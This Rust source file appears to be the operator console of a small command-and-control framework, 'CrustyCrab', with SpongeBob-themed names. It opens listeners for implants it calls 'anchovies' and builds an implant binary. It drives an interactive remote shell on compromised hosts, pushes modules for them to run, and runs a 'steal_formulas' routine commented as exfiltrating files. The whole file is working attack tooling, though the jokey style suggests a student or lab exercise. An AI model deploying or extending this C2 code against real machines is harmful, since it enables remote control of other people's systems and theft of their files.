// Ignore Warnings
#![allow(unused_variables)]
#![allow(unused_mut)]
#![allow(unused_imports)]
#![allow(unused_must_use)]
#![allow(unused_assignments)]
#![allow(unreachable_code)]
#![allow(dead_code)]

use std::{fs, process};
use std::io::{self, Write};
use std::net::{IpAddr, Ipv4Addr, SocketAddr, UdpSocket, TcpListener, TcpStream, Shutdown};
use std::process::{Command};
use rand::Rng;
use regex::Regex;
use log::{info, warn, error, debug};
use crabby_patty_formula::*;
use std::{thread, time};
use std::sync::{Arc, Mutex};
use std::mem::drop;

mod usr_mods;

fn main() {
    // clear console first
    Command::new("clear").status().unwrap();
    // print the super cool banner
    banner();

    //Vec<(ID, PORT, PROTOCOL, )>
    let mut listen_tracker: Vec<(u64, u16, String)> = Vec::new();
    let mut anchovy_list: Vec<(Vec<(u64, u16, String)>, Arc<Mutex<SharedBuffer>>)> = Vec::new();
    let mut relay_port = 2000;
    let mut sb_arc = Arc::new(Mutex::new(SharedBuffer {
        cc: 0,
        buff: [0; 2048].to_vec(),
    }));
    //Defaults
    let mut protocol: u16 = 2;
    let mut listen_port: u16 = 2120;
    let mut local_address = SocketAddr::from(([127, 0, 0, 1], listen_port));
    let mut curr_module = String::new();
    // main program loop
    loop {
        // print the prompt and read in a command
        // !TODO Make main shell more posix compliant

        print!("CrustyCrab $ ");
        io::stdout().flush().unwrap();
        let mut usr_cmd = String::new();
        let _output = io::stdin().read_line(&mut usr_cmd);

        // regex that removes multiple spaces
        let re = Regex::new(r"\s+").unwrap();
        usr_cmd = re.replace_all(&usr_cmd, " ").to_string();
        //let re = Regex::new(r"");


        // allows user to execute multiple commands in a single line seperated by ;
        let mut cmds = usr_cmd.split(';');

        // loop through each command given
        let mut head = cmds.next();
        while head != None {
            let current_cmd = head.unwrap().trim();

            if current_cmd.eq("exit") || current_cmd.eq("quit") || current_cmd.eq("q"){ 
                // quit the program
                process::exit(0);
            } 
            else if current_cmd.contains("help") { 
                // print the help menu
                help();
            }
            else if current_cmd.eq("banner") { // print the banner
                banner();
            }
            else if current_cmd.eq("listen") {
                println!("[+] Opening Crusty Crab");
                info!("[+] Opening Crusty Crab");

                //Passes vector of listeners and current port
                sb_arc = Arc::clone(&open_crusty_crab(&mut listen_tracker, listen_port, local_address, protocol));
            }
            else if current_cmd.eq("pwd")
                || current_cmd.eq("whoami")
                || current_cmd.eq("clear")
                || current_cmd.eq("top")
                || current_cmd.eq("w")
                || current_cmd.eq("which")
                || current_cmd.eq("whereis")
                || current_cmd.contains("ls")
                //|| current_cmd.contains("mv")
                //|| current_cmd.contains("cp")
                //|| current_cmd.contains("cd")
                //|| current_cmd.contains("mkdir")
                //|| current_cmd.contains("rmdir")
                //|| current_cmd.contains("rm")
                || current_cmd.contains("awk")
                || current_cmd.contains("grep")
                || current_cmd.contains("sed")
                || current_cmd.contains("cat")
                || current_cmd.contains("dig")
                || current_cmd.contains("nslookup")
                || current_cmd.contains("ps")
                || current_cmd.contains("uname")
                || current_cmd.contains("man")
                || current_cmd.contains("ifconfig")
            {
                
                let mut base = Command::new("sh");
                let mut result = base.arg("-c").arg(current_cmd).status().unwrap();
            }
            else if current_cmd.contains("exec") {
                println!("[+] Executing command");
                info!("[+] Executing command");
            }
            else if current_cmd.contains("shell"){
                println!("[+] Entering shell");
                sb_arc = Arc::clone(&shell(sb_arc.clone()));
            }
            else if current_cmd.eq("mod"){
                usr_mods::list_mods();
            }
            else if current_cmd.contains("use"){
                let mut command = current_cmd.split(' ');
                command.next();
                let module = command.next().unwrap().trim();
                curr_module = module.to_owned();
                println!("Module set to: {:?}", curr_module);
            }
            else if current_cmd.eq("send"){
                if curr_module.len() > 1{
                    sb_arc = Arc::clone(&send_module(sb_arc.clone(), curr_module.as_str()));
                }
                else{
                    println!("Select a valid module!");
                }
            }
            else if current_cmd.eq("steal_formulas"){
                sb_arc = Arc::clone(&steal_formulas(sb_arc.clone()));
            }
            else if current_cmd.contains("set") {
                // look for all commands that contain set
                let mut command = current_cmd.split(' ');

                command.next();
                let curr = command.next().unwrap().trim();
                if curr.eq("listen") {
                    // list all anchovies and get all info

                    let option = command.next().unwrap().trim();
                    let value = command.next().unwrap().trim();

                    if option.eq("port") {
                        
                        //Error check on setting port 
                        let result: Result<u16, _> = value.parse();
                        match result{
                            Ok(result) => {
                            listen_port = value.parse().unwrap();
                            local_address = SocketAddr::from(([127, 0, 0, 1], listen_port));
                            println!("[+] Setting default listener port to {}", listen_port);},
                            Err(e) => println!("Those are the wrong ingredients!"),
                        }
                    }
                    else if option.eq("protocol"){
                        match value{
                            "udp" | "UDP" => {protocol = 1;  
                                println!("[+] Setting default listener protocol to {}", "UDP");},
                            "tcp" | "TCP" => {protocol = 2;
                                println!("[+] Setting default listener protocol to {}", "TCP");},
                            "http" | "HTTP" => println!("We didn't finish making your crabby patty yet!"),
                            "dns" | "DNS" => println!("We didn't finish making your crabby patty yet!"),
                            &_ => println!("Those are the wrong ingredients!"),
                        
                        }
                    }
                }
                else if curr.eq("payload"){
                    println!("Sending out patty")
                }
                else if curr.eq("anchovy"){
                    // kill anchovy based on its number

                    let option = command.next().unwrap().trim();
                    let value = command.next().unwrap().trim();

                    if option.eq("ip"){
                        println!("[+] Setting anchovy server ip to {}", value);
                    }
                    else if option.eq("os"){
                        println!("[+] Setting default anchovy os to {}", value);
                    }
                    println!("sPongBOB what are you doin to me customers");
                }
            }
            else if current_cmd.contains("anchovy") {
                let mut command = current_cmd.split(' ');

                command.next();
                let option = command.next().unwrap().trim();
                let value = command.next().unwrap().trim();
                if option.eq("list") {
                    // list all anchovies and get all info
                    println!("[+] Listing all anchovies");
                    println!("Spongebob look at all the customers me boi ");
                }
                else if option.contains("select"){
                    println!("[+] Selected anchovy {}", value);
                    println!("One krabby patty coming up (anchovy select)");
                }
                else if option.eq("spawn"){
                    create_anchovy();
                }
                else if option.contains("kill"){
                    // kill anchovy based on its number
                    println!("[-] Killing anchovy");
                    println!("sPongBOB what are you doin to me customers (anchovy kill)");
                }
            }
            else if current_cmd.contains("listen") {
                let mut command = current_cmd.split(' ');

                command.next();

                let mut curr_head = command.next();
                let mut curr = curr_head.unwrap().trim();
                if curr.eq("exit") {
                    // list all anchovies and get all info
                    println!("Squidward take the trash out its time to close");
                }
                else if curr.contains("kill"){
                    let value = command.next().unwrap().trim();
                    
                    println!("Closing the register");
                }
                else if curr.eq("list"){
                    println!("\nID\tPORT\tPROTOCOL");
                    println!("------------------------------------------");
                    for listener in &listen_tracker{
                        println!("{:?}\t{:?}\t{}", listener.0, listener.1, listener.2.to_string().to_uppercase());
                    }
                    println!("------------------------------------------");
                    println!("Spongebob look at all me customers!\n");
                }
            }

            head = cmds.next();
        }
    }
}

// prints random ascii art
fn banner(){
    let mut rng = rand::thread_rng();

    let banner = format!("static/art/banner{}.txt",rng.gen_range(0..13));
    let contents = fs::read_to_string(&banner);

    println!("{c}\n", c=contents.unwrap());
}


// prints help optional second argument for more specific details
fn help(){
    let contents = fs::read_to_string("static/help.txt");
    println!("{c}\n", c=contents.unwrap());
}


// creates implant for server ip
fn create_anchovy() {
    println!("Spongebob there's another anchovy");

    let mut binding = Command::new("sh");
    let mut result  = binding.arg("-c").arg("cargo build -q --bin implant");
}


// open listener
fn open_crusty_crab(listeners: &mut Vec<(u64, u16, String)>, relay_port: u16, address: SocketAddr, prot_type: u16) -> Arc<Mutex<SharedBuffer>>{

    //Create a new listener
    let mut new_listen = new_lsn(listeners.len() as u64);
    let mut protocol = "udp";
    if prot_type == 1{
        protocol = "udp";
        
    }
    else if prot_type == 2{
        protocol = "tcp";
    }
    listeners.push(((listeners.len() as u64) + 1, relay_port, protocol.to_string()));
    
    //Create the shared buff and clone 
    let mut sb: Arc<Mutex<SharedBuffer>> = Arc::new(Mutex::new(SharedBuffer {
        cc: 0,
        buff: [0; 2048].to_vec(),
    }));

    let mut sb_arc = Arc::clone(&sb);
    
    let thr = thread::spawn(move ||
        {
            crabby_patty_formula::lsn_run(&mut new_listen, protocol, address, &mut sb);
        }
    );
    thread::sleep(time::Duration::from_millis(10));
    return sb_arc;

}


// Creates interactive shell with implant
// Exit shell with "exit" or "Exit"
fn shell(sb: Arc<Mutex<SharedBuffer>>) -> Arc<Mutex<SharedBuffer>>{
    let mut code: u8 = 5;
    if true {
        let mut buffer = sb.lock().unwrap();
        buffer.cc = code;
    }

    let mut swap = true;
    let mut exit_flag = false;
    // now we interact
    print!("anchovy_shell $ ");
    io::stdout().flush().unwrap();
    let mut memo: String = String::new();
    loop {
        if swap {
            //Exit command was given
            if exit_flag{
                let mut buffer = sb.lock().unwrap();
                buffer.cc = 101;
                break;
            }
            io::stdout().flush().unwrap();
            // read from stdin
            io::stdin().read_line(&mut memo);
            // check if we need to execute a module
            // write command to shared buffer
            let mut buffer = sb.lock().unwrap();
            buffer.buff = memo.as_bytes().to_vec();
            swap = false;
        }
        else {
            let mut buffer = sb.lock().unwrap();
            if  String::from_utf8_lossy(&buffer.buff[..]).contains("Exiting Shell"){
                io::stdout().flush().unwrap();
                swap = true;
                exit_flag = true;
            }
            else if !String::from_utf8_lossy(&buffer.buff[..]).contains(memo.as_str()) {
                print!("{}\nanchovy_shell $ ", String::from_utf8_lossy(&buffer.buff[..]));
                io::stdout().flush().unwrap();
                memo = String::new();
                swap = true;
            }
        }

        // wait until shared buffer changes
        // print changed shared buffer
        thread::sleep(time::Duration::from_millis(10));
    }
    
    return sb;
    
}


// Sends command for implant to execute module 
fn send_module(sb: Arc<Mutex<SharedBuffer>>, module: &str) -> Arc<Mutex<SharedBuffer>>{
    let mut code: u8 = 6;
    if true {
        let mut buffer = sb.lock().unwrap();
        buffer.cc = code;
    }
    let mut memo: String = module.to_string();
    let mut swap = true;
    loop {
        if swap {
            io::stdout().flush().unwrap();
            memo = module.to_string();
            // write to shared buffer
            let mut buffer = sb.lock().unwrap();
            buffer.cc = 6;
            buffer.buff = memo.as_bytes().to_vec();
            swap = false;
        }
        else {
            let mut buffer = sb.lock().unwrap();
            if !String::from_utf8_lossy(&buffer.buff[..]).contains(memo.as_str()) {
                let mut write_string = String::from_utf8_lossy(&buffer.buff[..]);
                println!("{}", String::from_utf8_lossy(&buffer.buff[..]));
                io::stdout().flush().unwrap();
                memo = String::new();
                break;
            }
        }
        thread::sleep(time::Duration::from_millis(10));
    }

    // 101 code keeps implant connected
    // but goes back to main loop
    let mut code: u8 = 101;
    if true {
        let mut buffer = sb.lock().unwrap();
        buffer.cc = code;
    }
    return sb;
}


// Exfil files in .secret_formulas dir
// Modules should check if dir is already created, if not create dir 
// Similar code to shell/module (no read in "if swap")
fn steal_formulas(sb: Arc<Mutex<SharedBuffer>>) -> Arc<Mutex<SharedBuffer>>{

    let mut code: u8 = 7;
    if true {
        let mut buffer = sb.lock().unwrap();
        buffer.cc = code;
    }
    let mut memo: String = String::new();
    let mut swap = true;
    loop {
        if swap {
            io::stdout().flush().unwrap();
            // write to shared buffer
            let mut buffer = sb.lock().unwrap();
            buffer.cc = 7;
            buffer.buff = memo.as_bytes().to_vec();
            swap = false;
        }
        else {
            let mut buffer = sb.lock().unwrap();
            if !String::from_utf8_lossy(&buffer.buff[..]).contains(memo.as_str()) {
                let mut write_string = String::from_utf8_lossy(&buffer.buff[..]);
                println!("{}", String::from_utf8_lossy(&buffer.buff[..]));
                io::stdout().flush().unwrap();
                memo = String::new();
                break;
            }
            break;
        }
        thread::sleep(time::Duration::from_millis(10));
    }
    
    // 101 code keeps implant connected
    // but goes back to main loop
    let mut code: u8 = 101;
    if true {
        let mut buffer = sb.lock().unwrap();
        buffer.cc = code;
    }
    return sb;

}